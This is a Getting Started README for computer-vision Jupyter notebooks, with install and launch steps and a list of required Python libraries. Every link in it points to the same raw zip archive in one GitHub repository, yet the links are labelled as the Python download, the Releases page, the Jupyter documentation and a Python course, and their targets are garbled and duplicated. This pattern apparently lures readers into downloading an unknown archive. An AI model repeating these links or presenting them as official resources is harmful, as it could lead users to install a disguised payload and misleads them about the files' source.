## 🚀 Getting Started
To get started with the Jupyter notebooks, follow these steps:

1. **Install Jupyter Notebook**: 
   - Ensure you have Python installed on your computer. You can download it from [https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip 2/Workshop https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip](https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip 2/Workshop https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip).
   - Open your terminal (Command Prompt on Windows, Terminal on macOS or Linux).
   - Install Jupyter by running the following command:
     ```
     pip install notebook
     ```

2. **Download the Jupyter Notebooks**:
   - Visit the [Releases page](https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip 2/Workshop https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip) to download the files you need. 

3. **Extract the Files**:
   - Once downloaded, locate the file on your computer. It will be in a compressed format such as `.zip`.
   - Extract the contents of the file to a folder of your choice. You can usually do this by right-clicking the file and selecting "Extract All."

4. **Launch Jupyter Notebook**:
   - Navigate to the folder where you extracted the notebooks using your terminal.
   - Run the following command:
     ```
     jupyter notebook
     ```
   - This will open a new window in your default web browser that shows the contents of the folder.

5. **Open a Notebook**:
   - Click on any Jupyter notebook file (with a `.ipynb` extension) to open it.
   - You can now run the cells within the notebook. Use Shift + Enter to execute each cell.

## 📚 Resources and Documentation
- For help on using Jupyter notebooks, you can refer to the official [Jupyter documentation](https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip 2/Workshop https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip).
- If you're new to Python, consider checking out the [Python for Everybody](https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip 2/Workshop https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip) course to build your foundational knowledge.

## 💻 System Requirements
- **Operating System**: Compatible with Windows, macOS, and Linux.
- **Python**: Version 3.6 or higher.
- **Memory**: At least 4 GB of RAM is recommended for smooth performance.
- **Storage**: Ensure sufficient disk space for installing required libraries and storing notebooks.

## 🛠️ Installation of Required Libraries
You may need to install additional Python libraries to run the notebooks effectively. Open your terminal and run the following commands:
```bash
pip install numpy
pip install opencv-python
pip install torch torchvision
pip install matplotlib
```

## 🔧 Troubleshooting
- If Jupyter doesn't launch, check if you installed it correctly.
- Ensure that your terminal is in the correct directory of the notebooks.
- If you encounter a library error, you may need to install the missing library using the commands provided above.
